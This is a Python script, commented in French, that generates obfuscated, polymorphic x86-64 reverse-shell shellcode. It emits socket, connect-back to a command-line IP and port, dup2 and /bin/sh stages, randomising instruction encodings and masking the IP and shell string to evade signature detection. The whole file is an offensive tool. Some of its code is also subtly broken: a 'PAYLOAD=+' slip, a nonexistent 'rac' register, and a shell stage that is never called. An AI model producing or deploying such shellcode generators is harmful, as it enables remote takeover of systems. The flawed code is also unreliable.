#/usr/bin/env python3

from random import randint as r
import socket
from sys import argv

#import htons

def verifOffus(binBashHexa):
    for i in range(0,18,2):
        if i == 0 :
                continue
        
        sub ="0x"+binBashHexa[i] + binBashHexa[i+1]
        numInHex = int(sub,16)
        if numInHex == int("0x00",16) or numInHex == int("0xff",16) :
            return False
    return True


def factorOffus(string4Payload):
    if verifOffus(string4Payload) == False:
        return string4Payload

    global PAYLOAD
    arr = []
    ope = r(1,2)
   
    for i in range(0,18,2):
        if i == 0 :
                continue
        
        sub ="0x"+string4Payload[i] + string4Payload[i+1]
        numInHex = int(sub,16)
        print(sub, numInHex)

        for j in range(1,15):
            
            
            if ope == 1 :
                tmp = numInHex - j
                
                if tmp < 255 and tmp > 0:
                    arr.append(j)
                else:
                    break

            if ope == 2 :
                tmp = numInHex + j
                if tmp < 255 and tmp > 0:
                    arr.append(j)
                else:
                    break

    arr[:] = list(set(arr)) #Rend unique chaque valeurs
    rand = r(arr[0],arr[-1])

    if ope == 1 :
         rand = rand * -1
    print(rand)
    return rand

def offus(string4Payload, rand):
    newString = "0x"

    for i in range(2,18,2):
        if i == 0 :
                continue
        
        sub = string4Payload[i] + string4Payload[i+1]
        numInDec = int(sub,16) + rand
        numInHex = hex(numInDec)
        newString = newString + str(numInHex[-2:])
    
    return newString


def clean(reg):
    if str(reg) == "rax":
        l = ["4831c0", "4829c0", "48c1e810"]
        return l[r(0,2)]
    elif str(reg) == "rbx":
        l = ["4831db","4829db", "48c1eb10"]
        return l[r(0,2)]
    elif str(reg) == "rcx":
        l = ["4831c9","4829c9", "48c1e910"]
        return l[r(0,2)]
    elif str(reg) == "rdx":
        l = ["4831d2","4829d2", "48c1ea10"]
        return l[r(0,2)]
    elif str(reg) == "rsi":
        l = ["4831f6", "48c1ee10"]
        return l[r(0,1)]
    elif str(reg) == "rdi":
        l = ["4831ff","48c1ef10"]
        return l[r(0,1)]




def create_socket():
    global PAYLOAD
    # On set rax à 41 (le premier cas correspond à "add rax,41" le deuxième à "mov rax, 0x29")
    PAYLOAD += "b029" if r(0,1) else "0429"
    # On set rbx à 2 pour ensuite le copier dans rdi (le premier cas correspond à "mov bl, 0x02; mov rdi, rbx" le deuxième à "add bl, 0x02, mov rdi, rbx" le troisième correspond à un "inc rdi, inc rdi")
    rand = r(0,2)
    if rand == 0:
        PAYLOAD += "b3024889df"
    elif rand == 1:
        PAYLOAD += "80c3024889df"
    elif rand == 2:
        PAYLOAD += "48ffc748ffc7"
    clean("rbx")
    # On set rbx à 1 pour ensuite le copier dans rsi (le premier cas correspond à "mov bl, 0x01; mov rsi, rbx" le deuxième à "add bl, 0x01, mov rsi, rbx" le troisième correspond à "inc rsi")
    rand = r(0,2)
    if rand == 0:
        PAYLOAD += "b3014889de"
    elif rand == 1:
        PAYLOAD += "80c3014889de"
    elif rand == 2:
        PAYLOAD += "48ffc6"
    PAYLOAD += call()


def socket_connect(ip, port):
   global PAYLOAD
   l = ["4889C74989FA", "4889C74989C2", "50415A4C89D7", "4989C24889C7"] # mov rdi, rax; mov r10, rax | push rax; pop rdi; mov r10, rdi | push rax; pop r10; mov rdi, r10 | mov r10, rax ; mov rdi, rax
   PAYLOAD += l[r(0,len(l)-1)]   
   clean("rax")
   PAYLOAD += "B02A" if r(0,1) else "042A"
   clean("rbx")
   PAYLOAD += "53" # push rbx
   ip_greater = []
   ip_to_substract = []
   cmp = 0
   for ip in ip.split("."):
    ip_to_substract.append(r(int(ip)+1, 255))
    ip_greater.append(ip_to_substract[cmp] - int(ip))
    cmp += 1
    
    
    PAYLOAD += "BE" # mov esi
    for i in range(0, len(ip_to_substract)):
        if ip_to_substract[i] < 17: PAYLOAD += "0"
        PAYLOAD += hex(ip_to_substract[i])[2:]

    PAYLOAD += "81EE" # sub esi
    for i in range(0,len(ip_greater)):
        if ip_greater[i] < 17: PAYLOAD += "0"
        PAYLOAD += hex(ip_greater[i])[2:]

    
    port = hex(socket.htons(int(port)))[2:]

    PAYLOAD += "566668" # push
    PAYLOAD += port[2:] + port[:2] # Le port en little endian    
    PAYLOAD += "666A02" #AF_INET
    PAYLOAD += "4889E6" if r(0,1) else "4831F64801E6" # soit on fait "mov rsi, rsp" soit on fait "xor rsi, rsi ; add rsi, rsp"
    PAYLOAD += "B218" # mov dl,24
    PAYLOAD += call()
    return PAYLOAD


def dup2x3():
    global PAYLOAD
    PAYLOAD += clean('rax')
    for i in range(0,3):
        PAYLOAD += "b03f"
        PAYLOAD += "4c89d7"
        if not(i):
            PAYLOAD += clean('rsi')
        else:
            PAYLOAD += '48ffc6' # inc rsi
        PAYLOAD += call()



def shell():
    global PAYLOAD
    PAYLOAD+=clean("rax")
    PAYLOAD+=clean("rdx")
    PAYLOAD+=clean("rac")

    factorOffusVar = factorOffus("0x68732f6e69622f2f")
    offuString = offus("0x68732f6e69622f2f",factorOffusVar)
    offuString = offuString[::-1]#Inverse en mirroir tout la chaine pour op code

    PAYLOAD=+"48bb"
    for i in range(0,15,2):
        sub = offuString[i+1] + offuString[i] 
        PAYLOAD+= sub
        
    
    
        
    
def _exit():
    global PAYLOAD
    PAYLOAD+=clean("rax")
    PAYLOAD+=clean("rdx")
    PAYLOAD+="b03c"
    PAYLOAD +='4c89d7'
   # print(PAYLOAD)
    PAYLOAD += call()


def call():
    return '0f05'

def shellcodize(PAYLOAD):
    shellcode = 'X'
    shellcode += 'X'.join(a+b for a,b in zip(PAYLOAD[::2], PAYLOAD[1::2]))
    shellcode = shellcode.replace('X', '\\x')
    return(shellcode)

PAYLOAD = ""
PAYLOAD += clean("rax")
PAYLOAD += clean("rbx")
PAYLOAD += clean("rcx")
PAYLOAD += clean("rdx")
PAYLOAD += clean("rdi")
PAYLOAD += clean("rsi")
PAYLOAD += clean("rbx")
PAYLOAD += clean("rsi")
create_socket()
socket_connect(argv[1], argv[2])
dup2x3()
#factorOffus("0x68732f0069622f2f")
#print(PAYLOAD)
_exit()

#print(bit_to_opcode(PAYLOAD))
#print(PAYLOAD)
print(shellcodize(PAYLOAD))
